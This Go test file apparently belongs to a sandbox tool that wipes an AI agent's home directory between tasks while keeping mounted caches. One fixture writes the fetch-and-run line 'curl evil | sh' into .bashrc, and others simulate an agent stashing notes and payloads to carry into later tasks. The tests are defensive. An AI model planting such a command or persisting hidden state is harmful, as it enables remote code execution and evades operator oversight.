// Copyright 2026 Jeffrey B. Stewart
//
// Licensed under the Apache License, Version 2.0 (the "License");
// you may not use this file except in compliance with the License.
// You may obtain a copy of the License at
//
//     http://www.apache.org/licenses/LICENSE-2.0
//
// Unless required by applicable law or agreed to in writing, software
// distributed under the License is distributed on an "AS IS" BASIS,
// WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
// See the License for the specific language governing permissions and
// limitations under the License.

package main

import (
	"os"
	"path/filepath"
	"sort"
	"strings"
	"testing"

	"github.com/jeffbstewart/cloister/internal/operator"
)

// resetHome deletes recursively, so the tests that matter most here are the
// ones about what it must NOT delete.  A bug that leaves a dotfile behind
// costs us the property; a bug that walks into ~/caches destroys hours of
// the operator's warmed dependency caches belonging to projects this cell
// never touched.  They are not symmetrical mistakes.

func TestResetHomeClearsAgentStateAndSparesMounts(t *testing.T) {
	home := t.TempDir()
	skel := t.TempDir()

	// The skeleton the image seeds HOME from.
	mustWrite(t, filepath.Join(skel, ".bashrc"), "# stock\n")

	// What the agent could have left behind.  .bashrc is the one that
	// matters: it is not stashed data, it is code that every later
	// interactive shell in this cell executes.
	mustWrite(t, filepath.Join(home, ".bashrc"), "curl evil | sh\n")
	mustWrite(t, filepath.Join(home, ".bash_history"), "secrets\n")
	mustWrite(t, filepath.Join(home, "notes.md"), "carry this to the next task\n")
	if err := os.MkdirAll(filepath.Join(home, "stash", "deep"), 0o755); err != nil {
		t.Fatal(err)
	}
	mustWrite(t, filepath.Join(home, "stash", "deep", "payload"), "x")

	// The cell's other mounts, which must survive untouched.
	if err := os.MkdirAll(filepath.Join(home, "caches", "gradle"), 0o755); err != nil {
		t.Fatal(err)
	}
	mustWrite(t, filepath.Join(home, "caches", "gradle", "warmed.jar"), "expensive")
	if err := os.MkdirAll(filepath.Join(home, ".qwen"), 0o755); err != nil {
		t.Fatal(err)
	}
	mustWrite(t, filepath.Join(home, ".qwen", "settings.json"), "{}")

	preserve := map[string]bool{"caches": true, ".qwen": true}
	removed, err := resetHome(home, skel, preserve)
	if err != nil {
		t.Fatalf("resetHome: %v", err)
	}

	sort.Strings(removed)
	if got, want := strings.Join(removed, ","), ".bash_history,.bashrc,notes.md,stash"; got != want {
		t.Errorf("removed = %q, want %q", got, want)
	}

	// The agent's state is gone...
	for _, gone := range []string{".bash_history", "notes.md", "stash"} {
		if _, err := os.Stat(filepath.Join(home, gone)); !os.IsNotExist(err) {
			t.Errorf("%s survived the reset", gone)
		}
	}
	// ...and .bashrc is back to the image's version rather than absent,
	// so the next task starts from a known state instead of an empty one.
	if got := read(t, filepath.Join(home, ".bashrc")); got != "# stock\n" {
		t.Errorf(".bashrc = %q, want the skeleton copy — the agent's version must not survive, and neither should a hole where it was", got)
	}
	// The expensive thing is untouched.
	if got := read(t, filepath.Join(home, "caches", "gradle", "warmed.jar")); got != "expensive" {
		t.Error("the warmed dependency cache was damaged — that bind is shared across every project this user has")
	}
	if got := read(t, filepath.Join(home, ".qwen", "settings.json")); got != "{}" {
		t.Error("the qwen settings volume was damaged")
	}
}

// TestResetHomeRefusesShallowPaths: the structural rails.  These exist
// because this function is one bad HOME away from deleting something that
// matters a great deal.
func TestResetHomeRefusesShallowPaths(t *testing.T) {
	for _, bad := range []string{"", "relative/path", "/", "/home"} {
		if _, err := resetHome(bad, "/etc/skel", nil); err == nil {
			t.Errorf("resetHome(%q) was allowed; it must refuse", bad)
		}
	}
}

// TestMountedChildrenAreDiscoveredNotListed: the preserve set comes from the
// kernel, so adding a mount in compose cannot desynchronize it from a
// hard-coded list here — the failure mode of that drift is deleting the
// operator's data.
func TestMountedChildrenAreDiscoveredNotListed(t *testing.T) {
	// Real /proc/self/mountinfo shape: field 5 is the mount point.
	const mountinfo = `
25 30 0:24 / /home/agent rw,relatime shared:1 - ext4 /dev/sda1 rw
26 25 0:25 / /home/agent/caches rw,relatime shared:2 - ext4 /dev/sdb1 rw
27 25 0:26 / /home/agent/.qwen rw,relatime shared:3 - ext4 /dev/sdc1 rw
28 25 0:27 / /home/agent/.claude-session rw,relatime shared:4 - tmpfs tmpfs rw
29 25 0:28 / /home/agent/caches/gradle rw,relatime shared:5 - ext4 /dev/sdd1 rw
31 30 0:29 / /grange rw,relatime shared:6 - ext4 /dev/sde1 rw
32 30 0:30 / /tmp rw,relatime shared:7 - tmpfs tmpfs rw
`
	got := mountedChildren(strings.NewReader(mountinfo), "/home/agent")
	want := []string{".claude-session", ".qwen", "caches"}
	var names []string
	for n := range got {
		names = append(names, n)
	}
	sort.Strings(names)
	if strings.Join(names, ",") != strings.Join(want, ",") {
		t.Errorf("mountedChildren = %v, want %v", names, want)
	}
	// HOME itself is a mount and must NOT appear — it is the thing being
	// reset, not something to spare.
	if got["."] || got[""] {
		t.Error("the home mount point itself was added to the preserve set")
	}
	// A nested mount contributes its TOP component, so ~/caches survives
	// whole rather than being descended into.
	if !got["caches"] {
		t.Error("a mount at ~/caches/gradle did not protect ~/caches")
	}
}

func TestUnescapeMountPoint(t *testing.T) {
	// The kernel octal-escapes space, tab, newline and backslash.
	for _, tc := range []struct{ in, want string }{
		{`/home/agent`, `/home/agent`},
		{`/home/agent/my\040dir`, `/home/agent/my dir`},
		{`/home/agent/a\011b`, "/home/agent/a\tb"},
		{`/home/agent/back\134slash`, `/home/agent/back\slash`},
	} {
		if got := unescapeMountPoint(tc.in); got != tc.want {
			t.Errorf("unescapeMountPoint(%q) = %q, want %q", tc.in, got, tc.want)
		}
	}
}

// TestDisposeResetsHome: the wiring.  Clearing HOME is the point of all of
// the above, and a cleaner that is never called is indistinguishable from
// one that does not work.
func TestDisposeResetsHome(t *testing.T) {
	arc := &fakeArchivist{states: []operator.Status{{State: operator.StateProvisioned, Repo: "op/repo"}}}
	m, _, _ := rig(t, arc, "3\nq\n")
	resets := 0
	m.resetHome = func() { resets++ }
	if err := m.loop(t.Context()); err != nil {
		t.Fatalf("loop: %v", err)
	}
	if resets != 1 {
		t.Errorf("HOME was reset %d times across one dispose, want 1 — the task boundary is where the agent's state must stop", resets)
	}
}

func mustWrite(t *testing.T, path, content string) {
	t.Helper()
	if err := os.WriteFile(path, []byte(content), 0o644); err != nil {
		t.Fatal(err)
	}
}

func read(t *testing.T, path string) string {
	t.Helper()
	b, err := os.ReadFile(path)
	if err != nil {
		t.Fatalf("read %s: %v", path, err)
	}
	return string(b)
}
